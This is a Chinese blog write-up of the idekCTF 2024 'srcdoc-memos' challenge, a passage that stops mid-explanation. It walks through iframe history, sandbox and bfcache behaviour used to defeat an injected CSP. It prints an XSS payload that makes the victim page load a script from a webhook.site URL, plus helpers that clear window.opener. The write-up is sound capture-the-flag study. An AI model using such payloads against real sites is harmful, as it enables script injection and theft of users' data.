---
title: idekCTF 2024 筆記之 iframe 高級魔法
url: https://blog.huli.tw/2024/09/07/idek-ctf-2024-iframe/
source: Huli's blog
date: 2024-09-08
fetch_date: 2025-10-06T18:24:39.732734
---

# idekCTF 2024 筆記之 iframe 高級魔法

[Huli's blog](/)

[文章列表](/archives)
[分類](/categories)
[推薦閱讀](/recommend)
[關於我](/about)

目錄

[1  **srcdoc-memos**](#srcdoc-memos)

---

[2  **困難點**](#困難點)

---

[3  **解法**](#解法)
[3.1  1. iframe 的 navigation](#1-iframe-的-navigation)
[3.2  2. iframe reparenting 與 bfcache](#2-iframe-reparenting-與-bfcache)
[3.3  3. CSP 的繼承](#3-csp-的繼承)
[3.4  全部加在一起](#全部加在一起)

---

[4  **總結**](#總結)

[English](/2024/09/07/en/idek-ctf-2024-iframe/)

如果有什麼想回饋的（如對文章或部落格的感想），除了留言以外也能填表單跟我說：[表單連結](https://forms.gle/XuWyRC5qtSd2ANta8)。若是對更多 JavaScript 知識有興趣，歡迎參考我的新書[《JavaScript 重修就好》](https://www.tenlong.com.tw/products/9786267757048)

# idekCTF 2024 筆記之 iframe 高級魔法

2024年9月7日

[Security](/categories/Security/)

在 idekCTF 2024 中，由 icesfont 所出的一道題目 srcdoc-memos 十分有趣，牽涉到了許多 iframe 的相關知識。我沒有實際參加比賽，但賽後看了題目以及解法，還是花了好幾天才終於看懂為什麼，十分值得把過程以及解法記錄下來。

由於這題牽涉到不少與 iframe 相關的知識，我會盡量一步一步來，會比較好理解。

## srcdoc-memos

題目連結：<https://github.com/idekctf/idekctf-2024/tree/main/web/srcdoc-memos>

這題的程式碼如下，目標是達成 XSS 偷到預先設置好的 flag：

```
const escape = html => html
  .replaceAll('"', "&quot;")
  .replaceAll("<", "&lt;")
  .replaceAll(">", "&gt;");

const handler = (req, res) => {
  const url = new URL(req.url, "http://localhost");
  let memo;

  switch (url.pathname) {
  case "/":
    memo =
      cookie.parse(req.headers.cookie || "").memo ??
      `<h2>Welcome to srcdoc memos!</h2>\n<p>HTML is supported</p>`;

    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.end(`
<script>
document.head.insertAdjacentHTML(
  "beforeend",
  \`<meta http-equiv="Content-Security-Policy" content="script-src 'none';">\`
);
if (window.opener !== null) {
  console.error("has opener");
  document.documentElement.remove();
}
</script>

<h1>srcdoc memos</h1>
<div class="horizontal">
  <iframe srcdoc="${escape(memo)}"></iframe>
  <textarea name="memo" placeholder="<b>TODO</b>: ..." form="update">${escape(memo)}</textarea>
</div>
<form id="update" action="/memo">
  <input type="submit" value="update memo">
</form>
    `.trim());
    break;

  case "/memo":
    memo = url.searchParams.get("memo") ?? "";
    res.statusCode = 302;
    res.setHeader("Set-Cookie", cookie.serialize("memo", memo));
    res.setHeader("Location", "/");
    res.end();
    break;

  default:
    res.statusCode = 404;
    res.setHeader("Content-Type", "text/plain; charset=utf-8");
    res.end("not found");
  }
};
```

其實題目本身的功能滿簡單，就是有一個 `/memo?memo=xxx` 的 API 可以設置 cookie，接著在訪問 index 的時候，會把內容放到 `srcdoc` 去，但最重要的是同個頁面上有一段 script：

```
<script>
document.head.insertAdjacentHTML(
  "beforeend",
  \`<meta http-equiv="Content-Security-Policy" content="script-src 'none';">\`
);
if (window.opener !== null) {
  console.error("has opener");
  document.documentElement.remove();
}
</script>
```

主要會做兩件事情：

1. 加上 script-src none 的 CSP
2. 如果有 opener，就把內容移除掉

## 困難點

先別管 opener 那個，那個比較好解決，難的是 CSP。

看完題目之後我的思考過程是這樣的，由於 `<iframe srcdoc>` 的 CSP 會繼承它的 parent，因此上層有的話，下層一定有，所以要想辦法把那個 CSP 弄掉，那既然要弄掉，我唯一能想到的就是透過 `<iframe csp>` 屬性先加上 CSP，就能阻止那段 script 的載入。

但由於這一題的內容是透過 cookie 帶入，所以會有 same-site cookie 的限制，在我們的 origin 是沒辦法插入 iframe 的，cookie 會有問題，因此一定要在題目的 origin 使用 `<iframe csp>`，除了這個以外，我想不到任何方式可以把 CSP 拿掉。

## 解法

之所以會說 opener 比較好解決，是因為之前就有看過類似的題目。

要如何讓 opener 是 null 有幾個方法，第一個類似於 [SekaiCTF 2022 - Obligatory Calc](https://blog.huli.tw/2022/10/08/sekaictf2022-safelist-and-connection/#obligatory-calc) 中所出現過的，執行 `window.open` 之後就快速關閉自己，`opener` 就會是 null，這題的作者 icesfont 用的就是這個方法（如果是在 console 上測試，會發現執行以後什麼都不會發生，因為瀏覽器預設不能在沒有動作下就開啟新的 window，所以第二個 open 會被擋住）：

```
function openNoOpener(url, name) {
  open(URL.createObjectURL(new Blob([`
    <script>
      open("${url}", "${name}");
      window.close();
    <\/script>
  `], { type: "text/html" })));
}
```

第二個方法我是在 Discord 裡面看到 Jazzy 提的，其實只要 open 之後自己把 opener 設成 null 就好：

```
function openNoOpener(url, name) {
  let w = window.open(url, name)
  w.opener = null
}
```

之所以可以這樣，是因為剛開啟之後會有一小段時間，開啟的 window 跟當前 window 是 same-origin，所以這一段時間是可以操作它的，接著才會被導到要前往的 URL。

雖然失去了 opener，表面上看起來跟開啟後的 window 脫節了，但其實利用 name 屬性就能夠再次存取到它，這點我以前有寫過：[iframe 與 window.open 黑魔法](https://blog.huli.tw/2022/04/07/iframe-and-window-open/#windowopen)。

解決了 opener 的問題以後，就可以來看另一個最麻煩的地方，就是那一段 script，如果能讓它不執行，那很輕鬆就能做到 XSS。但要怎麼讓它不執行呢？以前有[寫過](https://blog.huli.tw/2022/04/07/iframe-and-window-open/#iframe-%E7%9A%84-csp) iframe 上有個屬性叫做 csp，加上它之後就可以設置 CSP。

如同前面所說的，因為 same-site cookie，因此要直接利用題目的 memo 功能嵌入，程式碼如下（修改自 Jazzy 在 Discord 中提供的 payload）：

```
<script>
  const challengeHost = 'http://localhost:1337'
  function openNoOpener(url, name) {
    let w = window.open(url, name)
    w.opener = null
  }

  let html = `
    html
    <script src="http://webhook.site/0fdd5e6d-0882-44de-b593-212aecf604c1"><\/script>
    <iframe csp="script-src http: https:" src="/"></iframe>
  `;

  openNoOpener(`${challengeHost}/memo?memo=${encodeURIComponent(html)}`, 'main');
</script>
```

利用 CSP 不讓 inline script 執行，然後再載入一次網頁，就會執行原本準備好的 script。不過我實際試了一下，現在最新版會有錯誤：

> Refused to display ‘<http://localhost:1337/>‘ in a frame. The embedder requires it to enforce the following Content Security Policy: ‘script-src http: https:’. However, the frame neither accepts that policy using the Allow-CSP-From header nor delivers a Content Security Policy which is at least as strong as that one.

如果頁面原本沒有 csp 的話，是沒辦法硬要加上去的。從賽後討論看起來比較舊版的 Chrome 對於 same-origin 的 csp 似乎限制沒這麼嚴格，因此只有在舊版可以（不過我也不確定就是了，我懶得找舊版來試了）。

接著講一下預期解，預期解牽涉到了很多 iframe 相關的知識，我陸續花了大概一週才真的理解到底預期解為什麼可以 work，為了方便理解，我把它拆成幾個小部分，順著看完應該就可以理解最後的預期解了。

### 1. iframe 的 navigation

由於 iframe 是一個獨立的 window，因此 iframe 本身當然也可以做 navigation，導去其他的地方。假設在網頁上有一個 iframe，原本的 src 是 A，接著你把 src 改成 B，此時如果按下上一頁（或是執行 `history.back()`），會發生什麼事情呢？有兩個可能性：

1. 整個網頁（top level）回到上一頁
2. iframe 回到上一頁（從 B 回到 A）

答案是 2，也就是說，當你在做 navigation 的時候，iframe 的紀錄也會被加進整體的 history 裡面。

知道這個前提之後，就可以來看一個狀況：

```
<body>
  <iframe sandbox id=f src="data:text/html,test1:<script>document.writeln(Math.random())</script>"></iframe>
  <button onclick="loadTest2()">load test2</button>
</body>
<script>
  function loadTest2() {
    f.removeAttribute('sandbox')
    f.src = 'data:text/html,test2:<script>document.writeln(Math.random())<\/script>'
  }
</script>
```

1. 先把 iframe 載入 test1，並且加上 sandbox，因此 script 不會執行
2. 按下 loadTest2 按鈕，把 iframe sandbox 拿掉，導去 test2，因此 script 會執行

此時如果按下 back 按鈕，理所當然的 iframe 會回到 test1，但是 sandbox 可能會有兩種狀況：

1. sandbox 也一起回到載入 test1 時的狀況
2. sandbox 維持現在的屬性，也就是沒有 sandbox

答案會是 2，sandbox 的屬性不會變，因此按下 back 之後，sandbox 沒了，test1 的 script 現在就可以執行了。

其實感覺也滿合理的，畢竟你只是改動 src 而已，沒有動 sandbox，因此 sandbox 維持在最新的狀態。

### 2. iframe reparenting 與 bfcache

剛剛的狀況是更改 sandbox 並且載入新的 src 之後，回到上一頁。接下來我們再來看另一個狀況，前半段相同，但載入新的 src 之後，我們不直接回到上一頁，而是先把整個網頁跳轉到其他頁面，接著才回去：

```
<body>
  <iframe sandbox id=f src="data:text/html,test1:<script>document.writeln(Math.random())</script>"></iframe>
  <button onclick="loadTest2()">load test2</button>
  <button onclick="location = 'a.html'">top level navigation</button>
</body>
<script>
  console.log('run')
  function loadTest2() {
    f.removeAttribute('sandbox')
    f.src = 'data:text/html,test2:<script>document.writeln(Math.random())<\/script>'
  }
</script>
```

測試流程是：

1. 等待 iframe 載入完畢，會在畫面上看到 test1，此時因為有 sandbox，所以 script 不會執行
2. 按下 load test2 按鈕，把 sandbox 移除，載入 test2，script 被執行
3. 按下 top level navigation，把網頁跳去其他地方
4. 按下瀏覽器上的上一頁

那按完上一頁之後，預期狀況會是什麼？會根據有沒有 bfcache，出現兩種結果，先看有 bfcache 的。

如果有 bfcache 的話，按完上一頁就會是剛剛一樣的狀態，可以觀察到：

1. console 沒有出現 run，代表 script 不會重新被執行
2. iframe 的 src 是 test2
3. test2 的隨機數跟剛剛一樣，代表 iframe 中的 script 也沒有重新被執行

畢竟叫做 bfcache 嘛，所以會完整保留剛剛的狀態，不會重新載入一次網頁。

那如果沒有 bfcache 呢？照理來說網頁應該要重新載入一次才對，所以預期的狀況會是最剛開始的樣子：

```
<iframe sandbox id=f src="data:text/html,test1:<script>document.writeln(Math.random())</script>"></iframe>
```

也就是一個 sandbox 的 iframe 載入 test1。

但如果實際按下上一頁，會發現結果是既不是一開始的 sandbox + test1，也不是剛才的 no sandbox + test2，而是兩者的混合體：sandbox + test2。

換句話說，sandbox 屬性維持了頁面最新的狀態，是有的，但是 iframe 的 src 卻不是最新的，而是留在歷史紀錄裡的 test2，兩者結合起來，就變成了 sandbox 的 test2。

這個「回到上一頁時，iframe 的 src 回到上次的內容」的機制，就叫做 iframe reparenting，似乎沒有對應的 spec 完整描述，而且各個瀏覽器的實作也都不太一樣。

這個行為大概就是：「...